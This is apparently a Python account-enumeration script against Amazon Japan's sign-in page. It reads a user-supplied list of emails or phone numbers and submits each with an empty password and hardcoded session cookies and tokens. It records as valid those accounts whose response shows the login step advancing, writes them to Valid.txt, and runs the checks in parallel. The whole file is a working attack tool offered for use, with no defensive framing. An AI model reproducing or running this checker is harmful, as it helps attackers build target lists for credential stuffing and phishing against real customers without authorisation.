import requests,urllib3
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()

class Amazon():
	def __init__(self,num):
		self.url  = "https://www.amazon.co.jp/ap/signin"
		self.num = num
		self.redirect = None
		self.workflowState = None
		self.appActionToken = None
		self.openid = None
		self.prevRID = None
		
	def check(self):
		headers = {
		  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		  'accept-language': 'en-US,en;q=0.9',
		  'content-type': 'application/x-www-form-urlencoded',
		  'cookie': 'i18n-prefs=JPY; session-id=355-0427412-7119139; lc-acbjp=en_US; sp-cdn="L5Z9:SG"; skin=noskin; ubid-acbjp=358-8824058-9864725; csm-hit=tb:GBRGJEXRGR97NYJENBJ0+s-9HPQVV5AR0YH7H20WAG6|1696529073952&t:1696529073952&adb:adblk_no; session-id-time=2327249077l; session-token="17PFNqzzkoUnJ52S+fFK8ajkwSX45R0Kl/Y0BX1CG2GNANUUYbOApXDn6+VNtGXxZGLkZLGy+8zE8qmkqbhFqK6UDNCdsCspRJDUSpj0iFSD/9qrySbFJ7hqKYGA9++ZY6z4V9nEWpQOvc7ZQlhWBnYOgVPW8KioFqkj2MFVKyoFh7dJP0v1adBKxrHqYcogYcXTQI+M2A1Zp+gK2fe5swbOZenMaZtAVbaP3ZNhgUJBwZJeOj1skWD2ZX8xY+kO1AbEwuqyMmnNbYpTISb4D3Zz1rorHC3HtzoyWlDtITdmn6y/CCx0qD/H6WTx9x2oI/K8pWa6CP5480lfZ3GoA1i/2Ql9PqPoXiu0lUr+qMs="; session-id=355-0427412-7119139; session-id-time=2327251665l; session-token="B0qKYE2C9ig5Op9S8mv+6tC2UaXJwK3C7/L48dmUgEe68+MR9Fn9y3eFB1pQ99k6xocHhOfuqU6kxxSem7vhGRroFUJ7Zhn4eVCZyCQA6cLVBFNT/pvQUp89WJ87Yw5AQwoOWKsr+NYJP2t+h7DxbWq72aruyw8i0Xs+qBp6QVsZvV23njdEfyG04KLkGWsxloBjF0TQf41BVj1TvP1kOuw0ZCfbw2iseV3akBPdu+0zJ6C+zYpxmd+EmgHZwPhnhgZPeFp+c+H2tladGhzfTt4xWrkOXujPpp63OGSGbHzdqJu/d+IUTLPiZZXGTH2T0VU9cNXKprzQXYwZtec+xyPVguV1qkLkwxxmn/f77ro="; ubid-acbjp=358-8824058-9864725',
		  'origin': 'https://www.amazon.co.jp',
		  'referer': 'https://www.amazon.co.jp/-/en/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2F%3Fref_%3Dnav_custrec_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=jpflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0',
		  'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
		  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'
		}
		data = {"appActionToken": "axj75bKgAh02PI5GJ01ue3kabVkj3D", 
		"appAction": "SIGNIN_PWD_COLLECT", 
		"subPageType": "SignInClaimCollect", 
		"openid.return_to": "ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvLmpwLz9yZWZfPW5hdl9jdXN0cmVjX3NpZ25pbg==", 
		"prevRID": "ape:OUhQUVZWNUFSMFlIN0gyMFdBRzY=", 
		"workflowState": "eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.RbOMXg9S8-hwQlEoeu7lJz6H5u4teJY-WahMSyP3DTVt_pnri-MvAg.DDdb6xMy9UXnNIU6.Y26NGsAyyYBrszgh8GkdLgeqJAXkfes1SUvOIGX9Afk_dVJ9SP03D4cS-V07W5TcnnmqDuNamN4gL1oM0vV6P5XJH2MD2q0gjBrp13mX6H9xexZUywEiQyIZLS5UzNBaVXailWKoTK0yEXvGw7COCsMwFS_69OmrG3j2pqq5Hai_OHkKyxA92vO47f1kNWvFE3jK2f3RpVcqMJJyc9dzNXx86N8jbIbh4pNWz_5MvPCGCZOLBPfLgt4gckJy9AaSlCokf0JfgNM2dsw8FkBh06ZhqKybZSaDCTaGsBdFh8LOuvmSBTdUy8is4cVmvdmJTvNPbUgKMW11cSWx9cClxrB6Bs0PNmiKTevF3FEF9OsLNIycmNI_.DWUe1LW6mCAjwY52fGR5uA", 
		"email": self.num, 
		"password": '', 
		"create": "0", 
		"metadata1": "ECdITeCs:"}
		res = requests.post(self.url, headers=headers, data=data).text
		
		if "ap_change_login_claim" in res:
			return True,res
		elif "There was a problem" in res:
			return False,res
		else:
			return False,res

class INDEx():
	def __new__ (self):
		print("""
		
AMZ JP BY AKEMI
		
		""")


def fun_action(num):
	
	num = num.strip()
	
	if num.isnumeric() and "+" not in num:
		num = "+%s" % num
	elif "@" in num:
		pass
	else:
		pass
			
	while True:
		try:
			A , Error = Amazon(num).check()
			
			if A:
				with open("Valid.txt","a") as ff:
					ff.write("%s\n" % num)
				print("[+] Yes ==> %s"  % num) 
				break
				
			else:
				
				print("[-] No ==> %s"  % num) 
				break
		except:pass
		
def main():
	
	# ~ INDEx()
	
	email = open( input("[-] List Name : ")  ,"r",encoding="Latin-1").read().splitlines()
	ThreadPool = Pool(2)
	ThreadPool.map(fun_action, email)


if __name__ == "__main__":
	INDEx()

	main()
